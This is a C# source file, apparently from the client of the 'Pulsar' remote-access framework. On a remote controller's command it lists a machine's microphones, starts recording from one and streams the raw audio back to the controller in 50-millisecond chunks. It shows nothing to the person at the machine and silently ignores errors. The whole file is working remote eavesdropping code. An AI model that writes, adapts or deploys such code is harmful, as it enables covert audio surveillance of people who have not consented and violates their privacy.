using NAudio.CoreAudioApi;
using NAudio.Wave;
using Pulsar.Common.Messages.Audio;
using Pulsar.Common.Messages.other;
using Pulsar.Common.Networking;
using System;
using System.Collections.Generic;

namespace Pulsar.Client.Messages
{
    public class AudioHandler : NotificationMessageProcessor, IDisposable
    {
        public override bool CanExecute(IMessage message) => message is GetMicrophone ||
                                                             message is GetMicrophoneDevice;
        public override bool CanExecuteFrom(ISender sender) => true;

        public ISender _client;

        bool _isStarted;

        public WaveInEvent _audioDevice;

        int _deviceID;

        public override void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case GetMicrophone msg:
                    Execute(sender, msg);
                    break;
                case GetMicrophoneDevice msg:
                    Execute(sender, msg);
                    break;
            }
        }

        private void Execute(ISender client, GetMicrophone message)
        {
            if (message.CreateNew)
            {
                _isStarted = false;
                _audioDevice?.Dispose();
                OnReport("Audio streaming started");
            }
            if (message.Destroy)
            {
                Destroy();
                OnReport("Audio streaming stopped");
                return;
            }
            if (_client == null) _client = client;
            if (!_isStarted)
            {
                try
                {
                    _deviceID = message.DeviceIndex;
                    _audioDevice = new WaveInEvent
                    {
                        DeviceNumber = _deviceID,
                        WaveFormat = new WaveFormat(message.Bitrate, WaveIn.GetCapabilities(_deviceID).Channels)
                    };
                    _audioDevice.BufferMilliseconds = 50;
                    _audioDevice.DataAvailable += sourcestream_DataAvailable;
                    _audioDevice.StartRecording();
                    _isStarted = true;
                }
                catch (Exception)
                {
                    //do nothing at the moment
                }
            }

        }

        private void sourcestream_DataAvailable(object notUsed, WaveInEventArgs e)
        {
            byte[] rawAudio = e.Buffer;
            try
            {
                _client.Send(new GetMicrophoneResponse
                {
                    Audio = rawAudio,
                    Device = _deviceID
                });
            }
            catch (Exception)
            {
                //do nothing at the moment
            }
        }

        private void Execute(ISender client, GetMicrophoneDevice message)
        {
            var deviceList = new List<Tuple<int, string>>();
            var enumerator = new MMDeviceEnumerator();
            for (int i = 0; i < WaveIn.DeviceCount; i++)
            {
                var deviceName = enumerator.EnumerateAudioEndPoints(DataFlow.Capture, DeviceState.Active)[i].ToString();
                deviceList.Add(Tuple.Create(i, deviceName));
            }
            enumerator.Dispose();

            client.Send(new GetMicrophoneDeviceResponse { DeviceInfos = deviceList });
        }

        public void Destroy()
        {
            _audioDevice.DataAvailable -= sourcestream_DataAvailable;
            _audioDevice.StopRecording();
            _isStarted = false;
        }

        /// <summary>
        /// Disposes all managed and unmanaged resources associated with this message processor.
        /// </summary>
        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposing && _audioDevice != null)
            {
                _audioDevice.Dispose();
                _audioDevice?.Dispose();
            }
        }
    }
}